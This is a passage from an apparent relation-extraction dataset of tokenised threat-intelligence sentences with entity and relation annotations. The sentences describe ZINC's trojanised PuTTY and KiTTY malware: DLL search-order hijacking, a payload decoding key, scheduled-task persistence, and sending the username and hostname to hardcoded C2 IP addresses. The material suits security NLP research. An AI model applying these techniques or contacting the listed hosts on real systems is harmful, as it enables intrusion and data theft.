"sent_id": 1, "global_pos": [39, 39], "name": "ReadMe.txt", "pos": [10, 11], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "SSH utility", "pos": [16, 18], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [50, 50], "name": "PUTTY.exe", "pos": [21, 22], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [55, 55], "name": "Event Horizon malware", "pos": [26, 29], "index": "6_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [59, 59], "name": "C : \\ProgramData\\colorui.dll", "pos": [30, 33], "index": "7_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [64, 64], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [35, 38], "index": "8_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [68, 68], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [39, 42], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [72, 72], "name": "ZINC", "pos": [0, 1], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "colorui.dll", "pos": [7, 8], "index": "11_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [89, 89], "name": "payload", "pos": [17, 18], "index": "12_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [94, 94], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [22, 23], "index": "13_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [108, 108], "name": "C2 server", "pos": [5, 7], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [112, 112], "name": "attackers", "pos": [9, 10], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [116, 116], "name": "malware", "pos": [13, 14], "index": "16_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [139, 139], "name": "PackageColor", "pos": [36, 37], "index": "17_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [145, 145], "name": "weaponized PuTTY", "pos": [42, 44], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [154, 154], "name": "ZINC", "pos": [5, 6], "index": "19_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [162, 162], "name": "PackageColor", "pos": [13, 14], "index": "20_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [165, 165], "name": "weaponized PuTTY", "pos": [16, 18], "index": "21_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [170, 170], "name": "executable", "pos": [21, 22], "index": "22_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [174, 174], "name": "username", "pos": [25, 26], "index": "23_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [176, 176], "name": "hostname", "pos": [27, 28], "index": "24_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [190, 190], "name": "executable", "pos": [8, 9], "index": "25_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [199, 199], "name": "172.93.201.253", "pos": [17, 18], "index": "26_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [228, 228], "name": "137.184.15.189", "pos": [8, 9], "index": "27_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [232, 232], "name": "KiTTY executable", "pos": [12, 14], "index": "28_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [242, 242], "name": "% AppData % \\mscoree.dll", "pos": [22, 26], "index": "29_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [251, 251], "name": "Mscoree.dll", "pos": [31, 32], "index": "30_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [255, 255], "name": "EventHorizon", "pos": [35, 36], "index": "31_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [267, 267], "name": "ZINC", "pos": [2, 3], "index": "32_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [271, 271], "name": "PuTTY", "pos": [6, 7], "index": "33_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [277, 277], "name": "DLL search order hijacking", "pos": [12, 16], "index": "34_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [284, 284], "name": "DLL files", "pos": [19, 21], "index": "35_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [294, 294], "name": "Windows processes", "pos": [29, 31], "index": "36_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [298, 298], "name": "% AppData % \\KiTTY\\PresentationHost.exe -EmbeddingObject", "pos": [33, 38], "index": "37_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "RD", "evidence": [1], "t": 3, "h": 4}, {"r": "RD", "evidence": [1], "h": 5, "t": 7}, {"r": "FR", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1], "h": 5, "t": 7}, {"r": "RD", "evidence": [1], "h": 5, "t": 9}, {"r": "RD", "evidence": [1], "h": 5, "t": 8}, {"r": "WR", "evidence": [1], "h": 5, "t": 9}, {"r": "WR", "evidence": [2], "h": 10, "t": 11}, {"r": "RD", "evidence": [2], "h": 10, "t": 12}, {"r": "RD", "evidence": [2], "h": 10, "t": 13}, {"r": "ST", "evidence": [3], "t": 14, "h": 15}, {"r": "RF", "evidence": [3], "t": 14, "h": 15}, {"r": "FR", "evidence": [3], "h": 15, "t": 16}, {"r": "FR", "evidence": [3], "t": 17, "h": 18}, {"r": "FR", "evidence": [3, 4], "h": 17, "t": 19}, {"r": "FR", "evidence": [4], "t": 20, "h": 21}, {"r": "RD", "evidence": [4], "h": 22, "t": 23}, {"r": "RD", "evidence": [4], "h": 22, "t": 24}, {"r": "CO", "evidence": [4, 5], "h": 22, "t": 25}, {"r": "ST", "evidence": [5], "h": 25, "t": 26}, {"r": "ST", "evidence": [6], "t": 27, "h": 28}, {"r": "RF", "evidence": [6], "t": 27, "h": 28}, {"r": "WR", "evidence": [6], "h": 28, "t": 29}, {"r": "WR", "evidence": [6], "h": 28, "t": 30}, {"r": "WR", "evidence": [6], "t": 30, "h": 31}, {"r": "WR", "evidence": [6], "t": 30, "h": 31}, {"r": "WR", "evidence": [6, 7], "t": 30, "h": 32}, {"r": "WR", "evidence": [6, 7], "t": 30, "h": 33}, {"r": "WR", "evidence": [7], "h": 34, "t": 35}, {"r": "EX", "evidence": [7], "t": 35, "h": 36}, {"r": "EX", "evidence": [7], "h": 36, "t": 37}]}, {"title": "054-5", "sents": [["For", "deployment", "of", "ZetaNile", ",", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "is", "necessary", "for", "the", "SSH", "utility", ".", "The", "malicious", "PUTTY.exe", "is", "programmed", "to", "install", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", ",", "copying", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["ZINC", "loads", "the", "second", "stage", "malware", ",", "colorui.dll", ",", "using", "DLL", "search", "order", "hijacking", "and", "decodes", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "for", "use", "in", "command", "and", "control", "."], ["After", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", ".", "Lastly", ",", "ZINC", "establishes", "persistence", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "weaponized", "PuTTY", "configuration", "."], ["To", "ensure", "persistence", ",", "the", "ZINC", "group", "establishes", "a", "daily", "scheduled", "task", "called", "PackageColor", "through", "the", "weaponized", "PuTTY", "configuration", ".", "The", "executable", "first", "acquires", "the", "username", "and", "hostname", "of", "the", "compromised", "system", "."], ["Once", "this", "information", "is", "obtained", ",", "the", "PuTTY", "executable", "sends", "it", "to", "a", "hardcoded", "IP", "address", ",", "172.93.201.253", ",", "via", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "deploys", "the", "embedded", "payload", ",", "mscoree.dll", ",", "in", "%", "AppData", "%", "\\mscoree.dll", "through", "various", "decoding", "phases", ".", "Mscoree.dll", "is", "detected", "as", "EventHorizon", "and", "is", "part", "of", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'s", "version", "of", "PuTTY", ",", "the", "ZetaNile", "malware", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "to", "perform", "tasks", "within", "the", "context", "of", "legitimate", "Windows", "processes", "such", "as", "%", "AppData", "%", "\\KiTTY\\PresentationHost.exe", "-EmbeddingObject", "."], ["The", "mscoree.dll", "malware", "is", "modularized", "so", "that", "once", "it", "establishes", "a", "connection", "to", "the", "compromised", "C2", "domain", ",", "it", "can", "install", "additional", "malware", "as", "necessary", "using", "existing", "C2", "communication", ".", "For", "instance", ",", "it", "can", "execute", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "ZetaNile", "pos": [3, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [10, 10], "name": "ReadMe.txt", "pos": [10, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "SSH utility", "pos": [16, 18], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "PUTTY.exe", "pos": [21, 22], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [26, 26], "name": "Event Horizon malware", "pos": [26, 29], "index": "4_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [30, 30], "name": "C : \\ProgramData\\colorui.dll", "pos": [30, 33], "index": "5_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [35, 35], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [35, 38], "index": "6_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [39, 39], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [39, 42], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "ZINC", "pos": [0, 1], "index": "8_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [50, 50], "name": "colorui.dll", "pos": [7, 8], "index": "9_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [60, 60], "name": "payload", "pos": [17, 18], "index": "10_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [65, 65], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [22, 23], "index": "11_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [79, 79], "name": "C2 server", "pos": [5, 7], "index": "12_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [83, 83], "name": "attackers", "pos": [9, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [87, 87], "name": "malware", "pos": [13, 14], "index": "14_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [110, 110], "name": "PackageColor", "pos": [36, 37], "index": "15_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [116, 116], "name": "weaponized PuTTY", "pos": [42, 44], "index": "16_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [125, 125], "name": "ZINC", "pos": [5, 6], "index": "17_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [133, 133], "name": "PackageColor", "pos": [13, 14], "index": "18_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [136, 136], "name": "weaponized PuTTY", "pos": [16, 18], "index": "19_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [141, 141], "name": "executable", "pos": [21, 22], "index": "20_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [145, 145], "name": "username", "pos": [25, 26], "index": "21_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [147, 147], "name": "hostname", "pos": [27, 28], "index": "22_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [161, 161], "name": "executable", "pos": [8, 9], "index": "23_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [170, 170], "name": "172.93.201.253", "pos": [17, 18], "index": "24_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [199, 199], "name": "137.184.15.189", "pos": [8, 9], "index": "25_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [203, 203], "name": "KiTTY executable", "pos": [12, 14], "index": "26_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [213, 213], "name": "% AppData % \\mscoree.dll", "pos": [22, 26], "index": "27_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [222, 222], "name": "Mscoree.dll", "pos": [31, 32], "index": "28_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [226, 226], "name": "EventHorizon", "pos": [35, 36], "index": "29_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [238, 238], "name": "ZINC", "pos": [2, 3], "index": "30_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [242, 242], "name": "PuTTY", "pos": [6, 7], "index": "31_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [248, 248], "name": "DLL search order hijacking", "pos": [12, 16], "index": "32_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [255, 255], "name": "DLL files", "pos": [19, 21], "index": "33_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [265, 265], "name": "Windows processes", "pos": [29, 31], "index": "34_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [269, 269], "name": "% AppData % \\KiTTY\\PresentationHost.exe -EmbeddingObject", "pos": [33, 38], "index": "35_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [276, 276], "name": "mscoree.dll malware", "pos": [1, 3], "index": "36_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [290, 290], "name": "C2 domain", "pos": [15, 17], "index": "37_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [293, 293], "name": "it", "pos": [18, 19], "index": "38_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [297, 297], "name": "malware", "pos": [22, 23], "index": "39_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [311, 311], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [36, 39], "index": "40_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [319, 319], "name": "mapistub.dll", "pos": [44, 45], "index": "41_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [323, 323], "name": "C2 server", "pos": [48, 50], "index": "42_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 1, "h": 2}, {"r": "RD", "evidence": [0], "h": 3, "t": 5}, {"r": "FR", "evidence": [0], "h": 3, "t": 4}, {"r": "WR", "evidence": [0], "h": 3, "t": 5}, {"r": "RD", "evidence": [0], "h": 3, "t": 7}, {"r": "RD", "evidence": [0], "h": 3, "t": 6}, {"r": "WR", "evidence": [0], "h": 3, "t": 7}, {"r": "WR", "evidence": [1], "h": 8, "t": 9}, {"r": "RD", "evidence": [1], "h": 8, "t": 10}, {"r": "RD", "evidence": [1], "h": 8, "t": 11}, {"r": "ST", "evidence": [2], "t": 12, "h": 13}, {"r": "RF", "evidence": [2], "t": 12, "h": 13}, {"r": "FR", "evidence": [2], "h": 13, "t": 14}, {"r": "FR", "evidence": [2], "t": 15, "h": 16}, {"r": "FR", "evidence": [2, 3], "h": 15, "t": 17}, {"r": "FR", "evidence": [3], "t": 18, "h": 19}, {"r": "RD", "evidence": [3], "h": 20, "t": 21}, {"r": "RD", "evidence": [3], "h": 20, "t": 22}, {"r": "CO", "evidence": [3, 4], "h": 20, "t": 23}, {"r": "ST", "evidence": [4], "h": 23, "t": 24}, {"r": "ST", "evidence": [5], "t": 25, "h": 26}, {"r": "RF", "evidence": [5], "t": 25, "h": 26}, {"r": "WR", "evidence": [5], "h": 26, "t": 27}, {"r": "WR", "evidence": [5], "h": 26, "t": 28}, {"r": "WR", "evidence": [5], "t": 28, "h": 29}, {"r": "WR", "evidence": [5], "t": 28, "h": 29}, {"r": "WR", "evidence": [5, 6], "t": 28, "h": 30}, {"r": "WR", "evidence": [5, 6], "t": 28, "h": 31}, {"r": "WR", "evidence": [6], "h": 32, "t": 33}, {"r": "EX", "evidence": [6], "t": 33, "h": 34}, {"r": "EX", "evidence": [6], "h": 34, "t": 35}, {"r": "ST", "evidence": [7], "h": 36, "t": 37}, {"r": "RF", "evidence": [7], "h": 36, "t": 37}, {"r": "FR", "evidence": [7], "h": 38, "t": 39}, {"r": "EX", "evidence": [7], "h": 39, "t": 40}, {"r": "RD", "evidence": [7], "h": 39, "t": 41}, {"r": "RF", "evidence": [7], "h": 39, "t": 42}]}, {"title": "054-6", "sents": [["ZINC", "loads", "the", "second", "stage", "malware", ",", "colorui.dll", ",", "using", "DLL", "search", "order", "hijacking", "and", "decodes", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "for", "use", "in", "command", "and", "control", "."], ["After", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", ".", "Lastly", ",", "ZINC", "establishes", "persistence", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "weaponized", "PuTTY", "configuration", "."], ["To", "ensure", "persistence", ",", "the", "ZINC", "group", "establishes", "a", "daily", "scheduled", "task", "called", "PackageColor", "through", "the", "weaponized", "PuTTY", "configuration", ".", "The", "executable", "first", "acquires", "the", "username", "and", "hostname", "of", "the", "compromised", "system", "."], ["Once", "this", "information", "is", "obtained", ",", "the", "PuTTY", "executable", "sends", "it", "to", "a", "hardcoded", "IP", "address", ",", "172.93.201.253", ",", "via", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "deploys", "the", "embedded", "payload", ",", "mscoree.dll", ",", "in", "%", "AppData", "%", "\\mscoree.dll", "through", "various", "decoding", "phases", ".", "Mscoree.dll", "is", "detected", "as", "EventHorizon", "and", "is", "part", "of", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'s", "version", "of", "PuTTY", ",", "the", "ZetaNile", "malware", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "to", "perform", "tasks", "within", "the", "context", "of", "legitimate", "Windows", "processes", "such", "as", "%", "AppData", "%", "\\KiTTY\\PresentationHost.exe", "-EmbeddingObject", "."], ["The", "mscoree.dll", "malware", "is", "modularized", "so", "that", "once", "it", "establishes", "a", "connection", "to", "the", "compromised", "C2", "domain", ",", "it", "can", "install", "additional", "malware", "as", "necessary", "using", "existing", "C2", "communication", ".", "For", "instance", ",", "it", "can", "execute", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["HTTP", "POST", "requests", "have", "a", "hardcoded", "UA", "string", "with", "a", "misspelled", "``", "Edge", "''", "and", "contain", "a", "unique", "ID", "for", "the", "gametype", "field", "and", "a", "hardcoded", "value", "for", "the", "type", "field", "for", "tracking", "purposes", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "ZINC", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "colorui.dll", "pos": [7, 8], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [17, 17], "name": "payload", "pos": [17, 18], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [22, 22], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [22, 23], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [36, 36], "name": "C2 server", "pos": [5, 7], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "attackers", "pos": [9, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "malware", "pos": [13, 14], "index": "6_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [67, 67], "name": "PackageColor", "pos": [36, 37], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [73, 73], "name": "weaponized PuTTY", "pos": [42, 44], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [82, 82], "name": "ZINC", "pos": [5, 6], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [90, 90], "name": "PackageColor", "pos": [13, 14], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [93, 93], "name": "weaponized PuTTY", "pos": [16, 18], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [98, 98], "name": "executable", "pos": [21, 22], "index": "12_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [102, 102], "name": "username", "pos": [25, 26], "index": "13_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [104, 104], "name": "hostname", "pos": [27, 28], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [118, 118], "name": "executable", "pos": [8, 9], "index": "15_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [127, 127], "name": "172.93.201.253", "pos": [17, 18], "index": "16_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [156, 156], "name": "137.184.15.189", "pos": [8, 9], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [160, 160], "name": "KiTTY executable", "pos": [12, 14], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [170, 170], "name": "% AppData % \\mscoree.dll", "pos": [22, 26], "index": "19_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [179, 179], "name": "Mscoree.dll", "pos": [31, 32], "index": "20_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [183, 183], "name": "EventHorizon", "pos": [35, 36], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [195, 195], "name": "ZINC", "pos": [2, 3], "index": "22_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [199, 199], "name": "PuTTY", "pos": [6, 7], "index": "23_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [205, 205], "name": "DLL search order hijacking", "pos": [12, 16], "index": "24_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [212, 212], "name": "DLL files", "pos": [19, 21], "index": "25_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [222, 222], "name": "Windows processes", "pos": [29, 31], "index": "26_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [226, 226], "name": "% AppData % \\KiTTY\\PresentationHost.exe -EmbeddingObject", "pos": [33, 38], "index": "27_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [233, 233], "name": "mscoree.dll malware", "pos": [1, 3], "index": "28_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [247, 247], "name": "C2 domain", "pos": [15, 17], "index": "29_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [250, 250], "name": "it", "pos": [18, 19], "index": "30_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [254, 254], "name": "malware", "pos": [22, 23], "index": "31_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [268, 268], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [36, 39], "index": "32_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [276, 276], "name": "mapistub.dll", "pos": [44, 45], "index": "33_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [280, 280], "name": "C2 server", "pos": [48, 50], "index": "34_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [283, 283], "name": "HTTP POST requests", "pos": [0, 3], "index": "35_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [304, 304], "name": "gametype field", "pos": [21, 23], "index": "36_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [308, 308], "name": "hardcoded value", "pos": [25, 27], "index": "37_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "ST", "evidence": [1], "t": 4, "h": 5}, {"r": "RF", "evidence": [1], "t": 4, "h": 5}, {"r": "FR", "evidence": [1], "h": 5, "t": 6}, {"r": "FR", "evidence": [1], "t": 7, "h": 8}, {"r": "FR", "evidence": [1, 2], "h": 7, "t": 9}, {"r": "FR", "evidence": [2], "t": 10, "h": 11}, {"r": "RD", "evidence": [2], "h": 12, "t": 13}, {"r": "RD", "evidence": [2], "h": 12, "t": 14}, {"r": "CO", "evidence": [2, 3], "h": 12, "t": 15}, {"r": "ST", "evidence": [3], "h": 15, "t": 16}, {"r": "ST", "evidence": [4], "t": 17, "h": 18}, {"r": "RF", "evidence": [4], "t": 17, "h": 18}, {"r": "WR", "evidence": [4], "h": 18, "t": 19}, {"r": "WR", "evidence": [4], "h": 18, "t": 20}, {"r": "WR", "evidence": [4], "t": 20, "h": 21}, {"r": "WR", "evidence": [4], "t": 20, "h": 21}, {"r": "WR", "evidence": [4, 5], "t": 20, "h": 22}, {"r": "WR", "evidence": [4, 5], "t": 20, "h": 23}, {"r": "WR", "evidence": [5], "h": 24, "t": 25}, {"r": "EX", "evidence": [5], "t": 25, "h": 26}, {"r": "EX", "evidence": [5], "h": 26, "t": 27}, {"r": "ST", "evidence": [6], "h": 28, "t": 29}, {"r": "RF", "evidence": [6], "h": 28, "t": 29}, {"r": "FR", "evidence": [6], "h": 30, "t": 31}, {"r": "EX", "evidence": [6], "h": 31, "t": 32}, {"r": "RD", "evidence": [6], "h": 31, "t": 33}, {"r": "RF", "evidence": [6], "h": 31, "t": 34}, {"r": "WR", "evidence": [6, 7], "h": 31, "t": 35}]}, {"title": "054-7", "sents": [["After", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", ".", "Lastly", ",", "ZINC", "establishes", "persistence", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "weaponized", "PuTTY", "configuration", "."], ["To", "ensure", "persistence", ",", "the", "ZINC", "group", "establishes", "a", "daily", "scheduled", "task", "called", "PackageColor", "through", "the", "weaponized", "PuTTY", "configuration", ".", "The", "executable", "first", "acquires", "the", "username", "and", "hostname", "of", "the", "compromised", "system", "."], ["Once", "this", "information", "is", "obtained", ",", "the", "PuTTY", "executable", "sends", "it", "to", "a", "hardcoded", "IP", "address", ",", "172.93.201.253", ",", "via", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "deploys", "the", "embedded", "payload", ",", "mscoree.dll", ",", "in", "%", "AppData", "%", "\\mscoree.dll", "through", "various", "decoding", "phases", ".", "Mscoree.dll", "is", "detected", "as", "EventHorizon", "and", "is", "part", "of", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'s", "version", "of", "PuTTY", ",", "the", "ZetaNile", "malware", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "to", "perform", "tasks", "within", "the", "context", "of", "legitimate", "Windows", "processes", "such", "as", "%", "AppData", "%", "\\KiTTY\\PresentationHost.exe", "-EmbeddingObject", "."], ["The", "mscoree.dll", "malware", "is", "modularized", "so", "that", "once", "it", "establishes", "a", "connection", "to", "the", "compromised", "C2", "domain", ",", "it", "can", "install", "additional", "malware", "as", "necessary", "using", "existing", "C2", "communication", ".", "For", "instance", ",", "it", "can", "execute", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["HTTP", "POST", "requests", "have", "a", "hardcoded", "UA", "string", "with", "a", "misspelled", "``", "Edge", "''", "and", "contain", "a", "unique", "ID", "for", "the", "gametype", "field", "and", "a", "hardcoded", "value", "for", "the", "type", "field", "for", "tracking", "purposes", "."], ["This", "malware", "has", "a", "unique", "PDBPath", ".", "Finally", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "readme.txt", "to", "aid", "them", "in", "running", "the", "archive", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [5, 5], "name": "C2 server", "pos": [5, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "attackers", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "malware", "pos": [13, 14], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [36, 36], "name": "PackageColor", "pos": [36, 37], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [42, 42], "name": "weaponized PuTTY", "pos": [42, 44], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [51, 51], "name": "ZINC", "pos": [5, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [59, 59], "name": "PackageColor", "pos": [13, 14], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [62, 62], "name": "weaponized PuTTY", "pos": [16, 18], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [67, 67], "name": "executable", "pos": [21, 22], "index": "8_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [71, 71], "name": "username", "pos": [25, 26], "index": 